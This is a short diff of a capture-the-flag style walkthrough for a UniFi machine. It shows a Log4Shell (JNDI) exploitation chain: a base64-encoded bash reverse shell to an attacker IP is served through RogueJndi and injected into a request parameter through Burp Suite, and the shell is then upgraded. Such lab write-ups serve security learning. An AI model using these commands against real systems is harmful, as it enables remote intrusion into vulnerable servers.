@@ -61,6 +61,10 @@ With this command we can encrypt the payload for the jndi echo 'bash -c bash -i 
 We insert that payload in the command for starting the jndi sv java -jar target/RogueJndi-1.1.jar --command "bash -c {echo,YmFzaCAtYyBiYXNoIC1pID4mL2Rldi90Y3AvMTAuMTAuMTUuMTU3LzMzMzMgMD4mMQo=}|{base64,-d}|{bash,-i}" --hostname "10.10.15.157"
 ![](../../Img/Pasted%20image%2020250424162840.png)
 in burp suite we replace the payload form the remember parameter with our new jdni port (${jndi:ldap://10.10.15.157/:1389/o=tomcat})
+we get the connection
+![](../../Img/Pasted%20image%2020250424163652.png)
+Upgrade it (script /dev/null -c bash)
+Now finally for the question
 Q9: What is the default database name for UniFi applications?
 
 A: 
